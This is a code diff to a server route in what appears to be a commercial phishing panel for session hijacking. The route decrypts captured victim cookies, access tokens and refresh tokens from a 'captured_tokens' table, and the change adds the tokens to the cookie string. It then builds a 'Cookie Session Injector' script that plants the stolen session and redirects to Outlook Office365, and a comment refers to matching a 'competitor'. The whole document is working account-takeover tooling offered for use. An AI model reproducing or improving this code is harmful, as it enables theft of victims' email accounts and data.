@@ -88,7 +88,7 @@ router.delete('/:id', userAuth, async (req, res) => {
   }
 });
 
-// Generate cookie script with 80-year expiration
+// Generate cookie script - COMBINES cookies + access_token + refresh_token
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
@@ -96,21 +96,20 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     
     const token = tokens[0];
     var cookies = decrypt(token.cookies_encrypted);
+    const accessToken = decrypt(token.access_token_encrypted);
+    const refreshToken = decrypt(token.refresh_token_encrypted);
     
     // If no stored cookies, try to convert from access_token
-    if ((!cookies || cookies.trim() === '') && token.access_token_encrypted) {
-      const accessToken = decrypt(token.access_token_encrypted);
-      if (accessToken) {
-        try {
-          const cookieConverter = require('../services/cookieconverter');
-          const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type);
-          if (result.success && result.cookies) {
-            cookies = result.cookies;
-            await db.query('UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?', [encrypt(cookies), 'cookie', token.id]);
-          }
-        } catch (convErr) {
-          console.error('[Tokens] Cookie conversion error:', convErr.message);
+    if ((!cookies || cookies.trim() === '') && accessToken) {
+      try {
+        const cookieConverter = require('../services/cookieconverter');
+        const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type);
+        if (result.success && result.cookies) {
+          cookies = result.cookies;
+          await db.query('UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?', [encrypt(cookies), 'cookie', token.id]);
         }
+      } catch (convErr) {
+        console.error('[Tokens] Cookie conversion error:', convErr.message);
       }
     }
     
@@ -118,8 +117,27 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No cookies available. Please use the Renew button to convert tokens to cookies first.', has_access_token: !!token.access_token_encrypted });
     }
     
+    // Build VERY LONG cookie string by combining ALL data
+    var parts = [];
+    
+    // Add stored cookies
     const cookieArray = cookies.split(';').map(function(c) { return c.trim(); }).filter(function(c) { return c; });
-    var cookieString = cookieArray.join('&');
+    for (var i = 0; i < cookieArray.length; i++) {
+      parts.push(cookieArray[i]);
+    }
+    
+    // Add access_token as a cookie value
+    if (accessToken) {
+      parts.push('access_token=' + accessToken);
+    }
+    
+    // Add refresh_token as a cookie value
+    if (refreshToken) {
+      parts.push('refresh_token=' + refreshToken);
+    }
+    
+    // Join with & separator for VERY long string like competitor
+    var cookieString = parts.join('&');
     
     var script = '// VGenius Cookie Session Injector\n';
     script += '// Automatic redirect in 3 seconds\n\n';
@@ -137,7 +155,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     script += '  window.location.href = "https://outlook.office365.com/";\n';
     script += '}, 3000);\n';
     
-    res.json({ script: script, cookie_count: cookieArray.length, cookies: cookieArray });
+    res.json({ script: script, cookie_count: parts.length, cookies: parts });
   } catch (err) {
     console.error('[Tokens] Cookie script error:', err);
     res.status(500).json({ error: 'Failed to generate script' });
